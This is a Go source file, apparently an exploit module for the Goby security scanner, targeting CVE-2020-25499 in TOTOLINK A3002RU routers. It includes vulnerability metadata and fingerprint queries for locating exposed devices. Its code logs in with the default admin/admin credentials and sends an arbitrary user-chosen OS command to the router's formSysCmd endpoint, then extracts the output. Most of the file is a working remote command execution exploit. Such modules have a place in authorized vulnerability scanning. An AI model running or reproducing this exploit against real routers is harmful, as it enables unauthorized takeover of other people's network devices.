package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "TOTOLINK routers remote command injection vulnerabilities (CVE-2020-25499)",
    "Description": "TOTOLINK A3002RU-V2.0.0 B20190814.1034 allows authenticated remote users to modify the system's 'Run Command'. An attacker can use this functionality to execute arbitrary OS commands on the router.",
    "Impact": "TOTOLINK routers remote command injection vulnerabilities (CVE-2020-25499)",
    "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://www.totolink.net/home/index/newsss/id/",
    "Product": "Totolink-A3002RU",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "TOTOLINK 路由器 formLogin 文件命令执行漏洞 (CVE-2020-25499)",
            "Description": "<p>A3002RU是一款第五代无线双频千兆路由器，符合最先进的802.11ac标准，可提供高达1167Mbps的Wi-Fi速度。</p><p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.totolink.net/home/menu/newstpl/menu_newstpl/products/id/163.html\">https://www.totolink.net/home/menu/newstpl/menu_newstpl/products/id/163.html</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Product": "Totolink-A3002RU",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "TOTOLINK routers remote command injection vulnerabilities (CVE-2020-25499)",
            "Description": "TOTOLINK A3002RU-V2.0.0 B20190814.1034 allows authenticated remote users to modify the system's 'Run Command'. An attacker can use this functionality to execute arbitrary OS commands on the router.",
            "Impact": "TOTOLINK routers remote command injection vulnerabilities (CVE-2020-25499)",
            "Recommendation": "Users can refer to the security bulletins provided by the following vendors to obtain patch information: https://www.totolink.net/home/index/newsss/id/",
            "Product": "Totolink-A3002RU",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "(body=\"/boafrm/formLogin\" && body=\"dw(password_warning)\") || (title==\"TOTOLINK\" || title=\"TOTOLINK Corp. | WIRELESS ROUTER\") || ((((title=\"RouterOS\" && body=\"mikrotik\") || title=\"mikrotik routeros\" || (title=\"Configuration\" && body=\"RouterOS\" && body=\"mikrotik\")) && header!=\"drupal\" && body!=\"<h2>Blog Comments</h2>\" && body!=\"Server: couchdb\" && header!=\"ReeCam IP Camera\") || (banner=\"MikroTik RouterOS\" || (protocol=\"snmp\" && banner=\"RouterOS\")))",
    "GobyQuery": "(body=\"/boafrm/formLogin\" && body=\"dw(password_warning)\") || (title==\"TOTOLINK\" || title=\"TOTOLINK Corp. | WIRELESS ROUTER\") || ((((title=\"RouterOS\" && body=\"mikrotik\") || title=\"mikrotik routeros\" || (title=\"Configuration\" && body=\"RouterOS\" && body=\"mikrotik\")) && header!=\"drupal\" && body!=\"<h2>Blog Comments</h2>\" && body!=\"Server: couchdb\" && header!=\"ReeCam IP Camera\") || (banner=\"MikroTik RouterOS\" || (protocol=\"snmp\" && banner=\"RouterOS\")))",
    "Author": "go0p",
    "Homepage": "https://www.totolink.net",
    "DisclosureDate": "2020-12-09",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "8.8",
    "CVEIDs": [
        "CVE-2020-25499"
    ],
    "CNVD": [
        "CNVD-2020-70958"
    ],
    "CNNVD": [
        "CNNVD-202012-763"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "/bin/busybox ifconfig",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10217"
}`

	doPost := func(u *httpclient.FixUrl, payload string) string {
		cfgLogin := httpclient.NewPostRequestConfig("/boafrm/formLogin")
		cfgLogin.VerifyTls = false
		cfgLogin.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfgLogin.Data = "submit-url=%2Flogin.htm&userAgent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F92.0.4515.107+Safari%2F537.36&username=admin&userpass=admin&x=87&y=33"
		if resp, err := httpclient.DoHttpRequest(u, cfgLogin); err == nil && resp.StatusCode == 404 {
			return ""
		}
		cfg := httpclient.NewPostRequestConfig("/boafrm/formSysCmd")
		cfg.FollowRedirect = true
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.Data = fmt.Sprintf("submit-url=%%2Fsyscmd.htm&sysCmd=%s", payload)
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			return resp.RawBody
		} else {
			return ""
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			payload := "echo+dfff0a7fa1a\"\"55c8c1a4966c19f6da452"
			if res := doPost(hostinfo, payload); strings.Contains(res, "dfff0a7fa1a55c8c1a4966c19f6da452") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := stepLogs.Params["cmd"].(string)
			cmd = url.QueryEscape(cmd)
			if body := doPost(expResult.HostInfo, cmd); len(body) > 0 {
				res := regexp.MustCompile(`(?s)virtual">(.*?)</textarea>`).FindStringSubmatch(body)
				if len(res) > 0 {
					expResult.Output = res[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
